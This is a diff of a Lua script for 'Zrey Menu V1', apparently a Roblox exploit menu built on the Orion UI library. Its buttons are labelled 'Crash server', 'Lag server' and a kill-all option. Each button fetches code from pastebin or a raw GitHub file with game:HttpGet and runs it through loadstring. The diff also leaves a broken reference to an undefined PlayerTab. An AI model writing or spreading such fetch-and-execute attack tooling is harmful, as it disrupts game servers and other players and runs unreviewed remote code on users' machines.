@@ -11,17 +11,17 @@ OrionLib:MakeNotification({
 local Window = OrionLib:MakeWindow({Name = "Zrey Menu V1", HidePremium = false, SaveConfig = true, ConfigFolder = "Zrey"})
 
 
-local PlayerTab = Window:MakeTab({
+local PlayersTab = Window:MakeTab({
     Name = "Player",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
 
-local PlayerSection = PlayerTab:AddSection({
+local PlayersSection = PlayerTab:AddSection({
     Name = "Funçoes"
 })
 
-PlayerSection:AddButton({
+PlayersSection:AddButton({
     Name = "Crash server",
     Callback = function(value)
     print(loadstring(game:HttpGet("https://pastebin.com/raw/HGBJqVMu",true))())
@@ -33,6 +33,11 @@ PlayersTab:AddButton({
     Callback = function()
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/Pedroxz63/killall/main/README.md'),true))()
       end   
+})
+local JogadorTab = Window:MakeTab({
+    Name = "Jogador",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
 })
 
 JogadorTab:AddButton({
@@ -68,7 +73,7 @@ PlayersTab:AddButton({
   	end    
 })
 
-PlayerSection:AddButton({
+PlayersSection:AddButton({
     Name = "Lag server",
     Callback = function(value)
     print(loadstring(game:HttpGet("https://pastebin.com/raw/HGBJqVMu",true))())
